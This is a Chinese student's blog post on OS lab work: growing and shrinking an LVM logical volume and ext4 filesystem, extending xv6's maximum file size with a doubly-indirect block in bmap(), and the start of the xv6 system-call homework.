<h5 id="扩大lv-逻辑卷-和fs-文件系统"><a href="#扩大lv-逻辑卷-和fs-文件系统" class="headerlink" title="扩大lv(逻辑卷)和fs(文件系统)"></a>扩大lv(逻辑卷)和fs(文件系统)</h5><p>假如现在又要一个大文件bigfile2, 大小为3G, 文件系统不够大了, 需要扩大lv 和 fs.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">yjn@yjn-virtual-machine:~/OS/data$ sudo lvextend -L 12G /dev/vg00/lv00</span><br><span class="line">  Size of logical volume vg00/lv00 changed from 10.00 GiB (2560 extents) to 12.00 GiB (3072 extents).</span><br><span class="line">  Logical volume vg00/lv00 successfully resized.</span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:~/OS/data$ sudo resize2fs /dev/vg00/lv00</span><br><span class="line">resize2fs 1.42.13 (17-May-2015)</span><br><span class="line">Filesystem at /dev/vg00/lv00 is mounted on /home/yjn/OS/data; on-line resizing required</span><br><span class="line">old_desc_blocks = 1, new_desc_blocks = 1</span><br><span class="line">The filesystem on /dev/vg00/lv00 is now 3145728 (4k) blocks long.</span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:~/OS/data$ df -h</span><br><span class="line">文件系统               容量  已用  可用 已用% 挂载点</span><br><span class="line">udev                   1.5G     0  1.5G    0% /dev</span><br><span class="line">tmpfs                  300M  8.9M  291M    3% /run</span><br><span class="line">/dev/sda1               17G  4.6G   12G   30% /</span><br><span class="line">tmpfs                  1.5G  132K  1.5G    1% /dev/shm</span><br><span class="line">tmpfs                  5.0M  4.0K  5.0M    1% /run/lock</span><br><span class="line">tmpfs                  1.5G     0  1.5G    0% /sys/fs/cgroup</span><br><span class="line">tmpfs                  300M   40K  300M    1% /run/user/1000</span><br><span class="line">/dev/mapper/vg00-lv00   12G  8.1G  3.1G   73% /home/yjn/OS/data</span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:~/OS/data$ sudo dd <span class="keyword">if</span>=/dev/zero of=bigfile2 bs=1M count=3096</span><br><span class="line">记录了3096+0 的读入</span><br><span class="line">记录了3096+0 的写出</span><br><span class="line">3246391296 bytes (3.2 GB, 3.0 GiB) copied, 1.92041 s, 1.7 GB/s</span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:~/OS/data$ ls -lh</span><br><span class="line">总用量 12G</span><br><span class="line">-rw-r--r-- 1 root root 8.0G 10月  3 18:29 bigfile1</span><br><span class="line">-rw-r--r-- 1 root root 3.1G 10月  3 18:34 bigfile2</span><br><span class="line">drwx------ 2 root root  16K 10月  3 18:24 lost+found</span><br></pre></td></tr></table></figure>

<h5 id="扩大pv-物理卷"><a href="#扩大pv-物理卷" class="headerlink" title="扩大pv(物理卷)"></a>扩大pv(物理卷)</h5><p>假如又要在放一个文件bigfile3, 大小为3G, 那么, pv中的剩余空间也不够了. 需要先扩pv, 再扩lv 和 fs.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">yjn@yjn-virtual-machine:~/OS/data$ sudo pvcreate /dev/sdb5</span><br><span class="line">  Physical volume <span class="string">"/dev/sdb5"</span> successfully created.</span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:~/OS/data$ sudo vgextend vg00 /dev/sdb5</span><br><span class="line">  Volume group <span class="string">"vg00"</span> successfully extended</span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:~/OS/data$ sudo vgs</span><br><span class="line">  VG   <span class="comment">#PV #LV #SN Attr   VSize   VFree </span></span><br><span class="line">  vg00   3   1   0 wz--n- &lt;15.99g &lt;3.99g</span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:~/OS/data$ sudo lvextend -L 15.5G /dev/vg00/lv00</span><br><span class="line">  Size of logical volume vg00/lv00 changed from 12.00 GiB (3072 extents) to 15.50 GiB (3968 extents).</span><br><span class="line">  Logical volume vg00/lv00 successfully resized.</span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:~/OS/data$ sudo resize2fs /dev/vg00/lv00</span><br><span class="line">resize2fs 1.42.13 (17-May-2015)</span><br><span class="line">Filesystem at /dev/vg00/lv00 is mounted on /home/yjn/OS/data; on-line resizing required</span><br><span class="line">old_desc_blocks = 1, new_desc_blocks = 1</span><br><span class="line">The filesystem on /dev/vg00/lv00 is now 4063232 (4k) blocks long.</span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:~/OS/data$ df -h</span><br><span class="line">文件系统               容量  已用  可用 已用% 挂载点</span><br><span class="line">udev                   1.5G     0  1.5G    0% /dev</span><br><span class="line">tmpfs                  300M  8.9M  291M    3% /run</span><br><span class="line">/dev/sda1               17G  4.6G   12G   30% /</span><br><span class="line">tmpfs                  1.5G  132K  1.5G    1% /dev/shm</span><br><span class="line">tmpfs                  5.0M  4.0K  5.0M    1% /run/lock</span><br><span class="line">tmpfs                  1.5G     0  1.5G    0% /sys/fs/cgroup</span><br><span class="line">tmpfs                  300M   40K  300M    1% /run/user/1000</span><br><span class="line">/dev/mapper/vg00-lv00   16G   12G  3.4G   77% /home/yjn/OS/data</span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:~/OS/data$ sudo dd <span class="keyword">if</span>=/dev/zero of=/home/yjn/OS/data/bigfile3 bs=1M count=3096</span><br><span class="line">记录了3096+0 的读入</span><br><span class="line">记录了3096+0 的写出</span><br><span class="line">3246391296 bytes (3.2 GB, 3.0 GiB) copied, 2.03317 s, 1.6 GB/s</span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:~/OS/data$ ls -lh</span><br><span class="line">总用量 15G</span><br><span class="line">-rw-r--r-- 1 root root 8.0G 10月  3 18:29 bigfile1</span><br><span class="line">-rw-r--r-- 1 root root 3.1G 10月  3 18:34 bigfile2</span><br><span class="line">-rw-r--r-- 1 root root 3.1G 10月  3 18:42 bigfile3</span><br><span class="line">drwx------ 2 root root  16K 10月  3 18:24 lost+found</span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:~/OS/data$ df -h ../data/</span><br><span class="line">文件系统               容量  已用  可用 已用% 挂载点</span><br><span class="line">/dev/mapper/vg00-lv00   16G   15G  313M   98% /home/yjn/OS/data</span><br></pre></td></tr></table></figure>

<h5 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h5><p>我们使用了由 sdb5(3GB), sdb6(&lt;3GB), sdc(10GB) 组成的卷组 vg00, 大小为 &lt;16GB.</p>
<p>在其中创建了一个大小为15.5GB的逻辑卷lv00, 此逻辑卷中创建了大小为15.5GB大小的文件系统, 并存放了 bigfile1(8G), bigfile2(3G), bigfile3(3G) 共14G的数据的三个大文件. </p>
<p>经测试, 文件系统随时可以扩大.</p>
<h4 id="缩小文件系统和相关的逻辑卷管理"><a href="#缩小文件系统和相关的逻辑卷管理" class="headerlink" title="缩小文件系统和相关的逻辑卷管理"></a>缩小文件系统和相关的逻辑卷管理</h4><h5 id="删除文件-卸载文件系统"><a href="#删除文件-卸载文件系统" class="headerlink" title="删除文件, 卸载文件系统"></a>删除文件, 卸载文件系统</h5><p>删除bigfile2, bigfile3, unmount文件系统, 为缩小文件系统做准备.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">yjn@yjn-virtual-machine:~/OS/data$ sudo rm bigfile2 bigfile3</span><br><span class="line">[sudo] yjn 的密码： </span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:~/OS/data$ ls</span><br><span class="line">bigfile1  lost+found</span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:~/OS/data$ <span class="built_in">cd</span> </span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:~$ sudo umount /home/yjn/OS/data </span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:~$ sudo e2fsck -f /dev/vg00/lv00 </span><br><span class="line">e2fsck 1.42.13 (17-May-2015)</span><br><span class="line">第一步: 检查inode,块,和大小</span><br><span class="line">第二步: 检查目录结构</span><br><span class="line">第3步: 检查目录连接性</span><br><span class="line">Pass 4: Checking reference counts</span><br><span class="line">第5步: 检查簇概要信息</span><br><span class="line">/dev/vg00/lv00: 12/1015808 files (0.0% non-contiguous), 2200073/4063232 blocks</span><br></pre></td></tr></table></figure>

<h5 id="缩小文件系统以及逻辑卷"><a href="#缩小文件系统以及逻辑卷" class="headerlink" title="缩小文件系统以及逻辑卷"></a>缩小文件系统以及逻辑卷</h5><p>缩小文件系统时, 我再次遇到了问题 :</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yjn@yjn-virtual-machine:~$ sudo resize2fs /dev/vg00/lv00 10G</span><br><span class="line">resize2fs 1.42.13 (17-May-2015)</span><br><span class="line">resize2fs: New size smaller than minimum (2660232)</span><br></pre></td></tr></table></figure>


<p>我也头一次听说原来文件系统是有最小值的.</p>
<p>那么, 根据它的最小值提示, 经过计算应约为10.14G大小.</p>
<p>在使用 resize2fs 工具时可以加上选项 -M, 就会将文件系统直接缩小到最小值.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">yjn@yjn-virtual-machine:~$ sudo resize2fs -M /dev/vg00/lv00</span><br><span class="line">resize2fs 1.42.13 (17-May-2015)</span><br><span class="line">Resizing the filesystem on /dev/vg00/lv00 to 2660232 (4k) blocks.</span><br><span class="line">The filesystem on /dev/vg00/lv00 is now 2660232 (4k) blocks long.</span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:~$ sudo lvreduce -L 11G /dev/vg00/lv00</span><br><span class="line">  WARNING: Reducing active logical volume to 11.00 GiB.</span><br><span class="line">  THIS MAY DESTROY YOUR DATA (filesystem etc.)</span><br><span class="line">Do you really want to reduce vg00/lv00? [y/n]: y</span><br><span class="line">  Size of logical volume vg00/lv00 changed from 15.50 GiB (3968 extents) to 11.00 GiB (2816 extents).</span><br><span class="line">  Logical volume vg00/lv00 successfully resized.</span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:~$ sudo mount /dev/vg00/lv00 /home/yjn/OS/data/</span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:~$ df -h /home/yjn/OS/data/</span><br><span class="line">文件系统               容量  已用  可用 已用% 挂载点</span><br><span class="line">/dev/mapper/vg00-lv00  9.9G  8.1G  1.4G   86% /home/yjn/OS/data</span><br><span class="line">yjn@yjn-virtual-machine:~$</span><br></pre></td></tr></table></figure>

<h3 id="bigger-files-for-xv6"><a href="#bigger-files-for-xv6" class="headerlink" title="bigger files for xv6"></a>bigger files for xv6</h3><p><a href="https://pdos.csail.mit.edu/6.828/2018/homework/xv6-big-files.html" target="_blank" rel="noopener">MIT 作业要求</a></p>
<h4 id="关于实验的一些概括性描述"><a href="#关于实验的一些概括性描述" class="headerlink" title="关于实验的一些概括性描述"></a>关于实验的一些概括性描述</h4><ul>
<li>实验目标 : 增加 xv6 文件的最大大小由约 70kB 到约 8.5MB.</li>
<li>实验环境 : Ubuntu 16.04 TLS</li>
<li>大体思路 :<br>xv6文件最大大小为 70KB 的原因是其 inode 包含12个 “直接” 指针和一个 “单一间接” 指针.<br>而xv6的每个数据块为 512B, 所以间接指针指向了共 512/4 = 128 个二级指针. 这样就总共有 128 + 12 = 140 个指针.<br>又因为每个指针都指向了一个512B大小的数据块. 所以就有 140 * 512 = 71680 B = 70KB 大小的文件.<br>那么要怎么实现增大最大大小呢?<br>只需要修改 <code>fs.c</code> 这个文件中的<code>bmap()</code>, 来实现原来的第十二个指针由直接指针改成一级间接指针, 原来的第十三个指针由一级间接指针改成二级间接指针.<br>这样, 指针的总数就是 11 + 128 + 128*128 = 16523 个, 它们指向的数据块的总大小就是 16523 * 512 = 8459776 B = 8.4 MB</li>
</ul>
<h4 id="安装-“big-工具”"><a href="#安装-“big-工具”" class="headerlink" title="安装 “big 工具”"></a>安装 “big 工具”</h4><p>在这次实验中, 需要一个能验证文件大小的方法. 所以这里需要做一些前期工作.</p>
<figure class="image-box">
                <a rel=一些有趣的实验 href="https://hexo-blog-1258787237.cos.ap-beijing.myqcloud.com/hexo-img/preliminaries.png" title="" data-fancybox="images"><img src="https://hexo-blog-1258787237.cos.ap-beijing.myqcloud.com/hexo-img/preliminaries.png" alt title class></a>
                <p></p>
            </figure>

<ol>
<li><p>在 <code>Makefile</code> 中修改<code>CPUS := 2</code> 为 <code>CPUS := 1</code>, 并在<code>QEMUOPTS</code>的前一行加入<code>QEMUEXTRA = -snapshot</code>.</p>
</li>
<li><p>修改 <code>param.h</code> 中的参数<code>FSSIZE</code>为<br><code>#define FSSIZE       20000  // size of file system in blocks</code></p>
</li>
<li><p>下载 <a href="https://pdos.csail.mit.edu/6.828/2018/homework/big.c" target="_blank" rel="noopener">big.c</a> 至 xv6 目录, 并在 Makefile 文件的 UPROGS 列表的末尾加入<code>_big\</code>.</p>
</li>
<li><p>在 xv6 目录输入 <code>make qemu</code> 编译并运行 xv6. 输入 big ,若显示140个blocks则表明成功.</p>
</li>
</ol>
<h4 id="分析原fs-c文件中的代码"><a href="#分析原fs-c文件中的代码" class="headerlink" title="分析原fs.c文件中的代码"></a>分析原<code>fs.c文件</code>中的代码</h4><p>要想在原xv6的基础修改并实现我们的功能, 必须要先读懂原来的代码.</p>
<p>头一次发现 C语言 的代码是如此晦涩难懂.</p>
<p>这里先附上<code>fs.c</code>中的<code>bmap()</code>的代码以及我的注释.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// bmap() 返回 第 bn 个数据块的位置</span></span><br><span class="line"><span class="keyword">static</span> uint </span><br><span class="line">bmap(struct inode *ip, uint bn)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// ip 是inode * 实例, 也就是我们将要读取的文件的inode指针</span></span><br><span class="line">  </span><br><span class="line">  uint addr, *a;  </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">buf</span> *<span class="title">bp</span>;</span></span><br><span class="line">  <span class="comment">// 这里的 NDIRECT = 12, 也就是直接指针的个数.</span></span><br><span class="line">  <span class="keyword">if</span>(bn &lt; NDIRECT)&#123;</span><br><span class="line">    <span class="comment">// 如果 bn &lt; NDIRECT, 说明查询直接指针所指向的数据块.</span></span><br><span class="line">    <span class="comment">// 因为 是直接指针, 所以指针是被保存在inode中的, 所以可以通过inode *ip直接访问.</span></span><br><span class="line">    <span class="keyword">if</span>((addr = ip-&gt;addrs[bn]) == <span class="number">0</span>)</span><br><span class="line">      <span class="comment">// dev 是 inode 中保存的设备的号码, 我估计应该是磁盘(储存设备)的设备代码)</span></span><br><span class="line">      ip-&gt;addrs[bn] = addr = balloc(ip-&gt;dev);</span><br><span class="line">    <span class="keyword">return</span> addr;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  bn -= NDIRECT;</span><br><span class="line">  <span class="comment">// NINDIRECT = BSIZE / sizeof(uint);</span></span><br><span class="line">  <span class="comment">// BSIZE = 512;</span></span><br><span class="line">  <span class="comment">// 所以 NINDIRECT = 512 / 4 = 128</span></span><br><span class="line">  <span class="comment">// 在结合之前的 bn -= NDIRECT, 此时的bn 含义成了一级间接指针的个数</span></span><br><span class="line">  <span class="comment">// 只要 bn &lt; NINDIRECT , 即可读取.</span></span><br><span class="line">  <span class="keyword">if</span>(bn &lt; NINDIRECT)&#123;</span><br><span class="line">    <span class="keyword">if</span>((addr = ip-&gt;addrs[NDIRECT]) == <span class="number">0</span>) </span><br><span class="line">      <span class="comment">// 如果 间接指针是空的, 我们就给它分配一个.</span></span><br><span class="line">      ip-&gt;addrs[NDIRECT] = addr = balloc(ip-&gt;dev);</span><br><span class="line">    <span class="comment">// bp 是缓冲变量, 相当于第13个指针的内容.</span></span><br><span class="line">    bp = bread(ip-&gt;dev, addr);</span><br><span class="line">    <span class="comment">// a 是 间接指针所指向的地址的数组.</span></span><br><span class="line">    a = (uint*)bp-&gt;data;</span><br><span class="line">    <span class="keyword">if</span>((addr = a[bn]) == <span class="number">0</span>)&#123;</span><br><span class="line">      <span class="comment">// 根据bmap()函数的意义, 我们只读取a[bn]即可.</span></span><br><span class="line">      a[bn] = addr = balloc(ip-&gt;dev);</span><br><span class="line">      log_write(bp);</span><br><span class="line">    &#125;</span><br><span class="line">    brelse(bp);</span><br><span class="line">    <span class="keyword">return</span> addr;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// bn &gt;= NINDIRECT, 已经超过最大文件大小了.</span></span><br><span class="line">  </span><br><span class="line">  panic(<span class="string">"bmap: out of range"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>经过漫长的阅读, 基本确定了这个函数的作用是返回第 bn 个数据块的地址. </p>
<p>其中的两个if分别代表读取直接指针指向的数据块和间接指针指向数据块的地址的两种情况.</p>
<p>如果这两种情况都不满足, 就说明文件过大而执行最后的报错语句.</p>
<h4 id="重写-bmap-函数"><a href="#重写-bmap-函数" class="headerlink" title="重写 bmap()函数"></a>重写 <code>bmap()</code>函数</h4><p>其实如果刚才的代码看懂了的话, 下面的工作就是照葫芦画瓢, 很简单.</p>
<p>我也分情况分别贴出代码.</p>
<ul>
<li>访问直接指针的数据块时.<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(bn &lt; NDIRECT)&#123;  <span class="comment">// 在fs.h中将这里修改为 11</span></span><br><span class="line">    <span class="keyword">if</span>((addr = ip-&gt;addrs[bn]) == <span class="number">0</span>)</span><br><span class="line">      ip-&gt;addrs[bn] = addr = balloc(ip-&gt;dev);</span><br><span class="line">    <span class="keyword">return</span> addr;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>这是最简单的情况, 只是将常量修改了.</p>
<ul>
<li>访问一级指针所指向的数据块时<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">bn -= NDIRECT;</span><br><span class="line"><span class="keyword">if</span>(bn &lt; NINDIRECT)&#123;</span><br><span class="line">  <span class="comment">// Load indirect block, allocating if necessary.</span></span><br><span class="line">  <span class="keyword">if</span>((addr = ip-&gt;addrs[NDIRECT]) == <span class="number">0</span>)</span><br><span class="line">    ip-&gt;addrs[NDIRECT] = addr = balloc(ip-&gt;dev);</span><br><span class="line">  bp = bread(ip-&gt;dev, addr);</span><br><span class="line">  a = (uint*)bp-&gt;data;</span><br><span class="line">  <span class="keyword">if</span>((addr = a[bn]) == <span class="number">0</span>)&#123;</span><br><span class="line">    a[bn] = addr = balloc(ip-&gt;dev);</span><br><span class="line">    log_write(bp);</span><br><span class="line">  &#125;</span><br><span class="line">  brelse(bp);</span><br><span class="line">  <span class="keyword">return</span> addr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>因为需要修改的常量已经在宏定义中改好了, 这段代码完全不需要改动.</p>
<ul>
<li>访问二级指针指向的数据块时<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">bn -= NINDIRECT;</span><br><span class="line"><span class="keyword">if</span>(bn &lt; <span class="number">128</span>*<span class="number">128</span>)&#123;</span><br><span class="line">  <span class="keyword">if</span>((addr = ip-&gt;addrs[<span class="number">12</span>]) == <span class="number">0</span>)&#123;</span><br><span class="line">    ip-&gt;addrs[<span class="number">12</span>] = addr = balloc(ip-&gt;dev);</span><br><span class="line">  &#125;</span><br><span class="line">  bp = bread(ip -&gt;dev, addr); <span class="comment">//读出第13个指针的内容.</span></span><br><span class="line">  a = (uint*)bp-&gt;data;</span><br><span class="line">  </span><br><span class="line">  uint aaddr, *aa;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">buf</span> *<span class="title">bbp</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>((aaddr = a[bn/<span class="number">128</span>]) == <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="comment">//先读第一级间接指针.</span></span><br><span class="line">    a[bn/<span class="number">128</span>] = aaddr = balloc(ip-&gt;dev);</span><br><span class="line">    log_write(bp);</span><br><span class="line">    &#125;</span><br><span class="line">  bbp = bread(ip-&gt;dev, aaddr);</span><br><span class="line">  aa = (uint*)bbp-&gt;data;</span><br><span class="line">  <span class="keyword">if</span>((aaddr = aa[bn % <span class="number">128</span>]) == <span class="number">0</span>)&#123;</span><br><span class="line">    aa[bn % <span class="number">128</span>] = aaddr = balloc(ip-&gt;dev);</span><br><span class="line">    log_write(bbp);</span><br><span class="line">  &#125;</span><br><span class="line">  brelse(bbp);</span><br><span class="line">  brelse(bp);</span><br><span class="line">  <span class="keyword">return</span> aaddr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>这里才是真正需要我们发挥的地方.</p>
<p>首先还是先将128个一级数据块减去 (为了清晰直观, 我没有使用常量而是128) , </p>
<p>然后判断inode里的第13个指针是否为空, 如果为空就分配一个.</p>
<p>利用 <code>bn / 128</code> 算出 bn 在第几个二级指针中.</p>
<p>再判断这个二级指针是否为空, 如果为空就分配一个.</p>
<p>再利用 <code>bn % 128</code> 算出 bn 再第几个三级指针中, </p>
<p>判断是否为空, 如果为空就为此三级指针分配地址, 最后函数返回的也是此三级指针的值.</p>
<p>除此之外, <code>log_write()</code>函数的作用可能是记录文件的变更, <code>brelse()</code>估计是类似析构函数的释放地址空间的作用.</p>
<p>别忘了在 fs.h 中修改几个常量的值.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">~~~</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NDIRECT 11</span></span><br><span class="line">~~~</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXFILE (NDIRECT + NINDIRECT + NINDIRECT*NINDIRECT )</span></span><br><span class="line">~~~</span><br><span class="line">uint addrs[NDIRECT+<span class="number">2</span>];   <span class="comment">// Data block addresses</span></span><br></pre></td></tr></table></figure>

<p>修改好这两个文件后, 重新编译<code>make qemu</code>.</p>
<p>输入big命令, 得到如下结果即为成功.</p>
<figure class="image-box">
                <a rel=一些有趣的实验 href="https://hexo-blog-1258787237.cos.ap-beijing.myqcloud.com/hexo-img/xv6.png" title="" data-fancybox="images"><img src="https://hexo-blog-1258787237.cos.ap-beijing.myqcloud.com/hexo-img/xv6.png" alt title class></a>
                <p></p>
            </figure>

<p>总的来说算是一次简单的实验了…</p>
<p>完.</p>
<h3 id="xv6-system-calls"><a href="#xv6-system-calls" class="headerlink" title="xv6 system calls"></a>xv6 system calls</h3><p><a href="https://pdos.csail.mit.edu/6.828/2018/homework/xv6-syscall.html" target="_blank" rel="noopener">MIT作业要求</a></p>
<ul>
<li>实验目的 : 增加一个新的系统调用函数 <code>date()</code></li>
</ul>
<h4 id="显示系统调用"><a href="#显示系统调用" class="headerlink" title="显示系统调用"></a>显示系统调用</h4><p>根据提示, 找到 <code>syscall.c</code> 中的 <code>syscall()</code>函数.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">syscall(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> num;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">curproc</span> = <span class="title">myproc</span>();</span></span><br><span class="line"></span><br><span class="line">  num = curproc-&gt;tf-&gt;eax;</span><br><span class="line">  <span class="keyword">if</span>(num &gt; <span class="number">0</span> &amp;&amp; num &lt; NELEM(syscalls) &amp;&amp; syscalls[num]) &#123;</span><br><span class="line">    <span class="comment">// 这里通过 syscall.h 中的宏定义实现由 num 到相应系统调用的映射.</span></span><br><span class="line">    curproc-&gt;tf-&gt;eax = syscalls[num]();</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    cprintf(<span class="string">"%d %s: unknown sys call %d\n"</span>,</span><br><span class="line">            curproc-&gt;pid, curproc-&gt;name, num);</span><br><span class="line">    curproc-&gt;tf-&gt;eax = <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>要想在系统调用时打印相关信息, 也模仿 else 中的语句就可以.</p>
